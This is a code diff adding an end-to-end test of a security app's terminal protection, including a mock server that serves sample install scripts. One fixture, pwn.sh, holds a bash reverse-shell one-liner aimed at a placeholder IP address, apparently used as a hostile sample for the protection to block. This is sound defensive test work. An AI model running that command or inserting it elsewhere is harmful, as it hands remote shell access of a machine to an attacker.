@@ -47,6 +47,9 @@ const json = (response, status, body) => {
 
 const server = createServer(async (request, response) => {
   const url = request.url ?? "";
+  // Install scripts for the terminal protection check.
+  if (url === "/scripts/pwn.sh") return void response.end('#!/bin/sh\ntouch "$PWNED"\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n');
+  if (url === "/scripts/hello.sh") return void response.end("#!/bin/sh\necho hello-from-script\n");
   if (url.startsWith("/api/v1/devices/")) {
     const body = await readBody(request);
     if (url === "/api/v1/devices/register") {
@@ -528,6 +531,33 @@ await page.waitForFunction(() => !matchMedia("(prefers-color-scheme: dark)").mat
 assert.equal(await canvas(), "rgb(247, 244, 238)");
 assert.equal(JSON.parse(await readFile(join(profile, "settings.json"), "utf8")).theme, "light");
 step("appearance: dark and light themes chosen in Settings, saved");
+
+// Terminal protection: turned on from the app, then real bash and zsh sessions are driven through a terminal.
+await writeFile(join(home, ".zshrc"), "# zsh user\n");
+await page.click('[data-tab="protection"]');
+await page.waitForSelector("#terminal-on");
+await page.click("#terminal-on");
+await page.waitForSelector("#terminal-state >> text=/On for bash, zsh/");
+assert.match(await readFile(join(home, ".bashrc"), "utf8"), /Qalaa terminal protection/);
+assert.match(await readFile(join(home, ".local", "bin", "qalaa"), "utf8"), /ELECTRON_RUN_AS_NODE=1/);
+await new Promise((r) => setTimeout(r, 1500));
+const integrityAfterTerminal = await page.evaluate(() => window.sentinel.integrityState());
+assert.equal(integrityAfterTerminal.changes.length, 0, "Qalaa's own edit to .bashrc raised no integrity alarm");
+// The file-integrity step above left a test line in .bashrc that would run at every shell start.
+await writeFile(join(home, ".bashrc"), (await readFile(join(home, ".bashrc"), "utf8")).replace(/^curl .*\n/m, ""));
+// Asynchronous: the mock server answering qalaa's script downloads runs in this same process.
+const { execFile } = await import("node:child_process");
+const shells = await new Promise((resolve, reject) =>
+  execFile("python3", [join(root, "test", "terminal-shells.py"), home, "http://127.0.0.1:8799/scripts", work], { env: { ...process.env, QALAA_DATA_DIR: profile }, encoding: "utf8", timeout: 180_000 }, (error, stdout, stderr) =>
+    error ? reject(new Error(`${error.message}\n${stdout}\n${stderr}`)) : resolve(stdout),
+  ),
+);
+assert.match(shells, /All terminal protection checks passed/);
+for (const line of shells.trim().split("\n").filter((l) => l.startsWith("✓"))) step(`terminal protection, ${line.slice(2)}`);
+await page.click("#terminal-off");
+await page.waitForSelector("#terminal-state >> text=Off.");
+assert.doesNotMatch(await readFile(join(home, ".bashrc"), "utf8"), /Qalaa terminal protection/);
+step("terminal protection turned off again; .bashrc restored");
 
 // Tools: startup manager, deep check, extensions, junk cleanup, shredder, firewall.
 await page.click('[data-tab="tools"]');
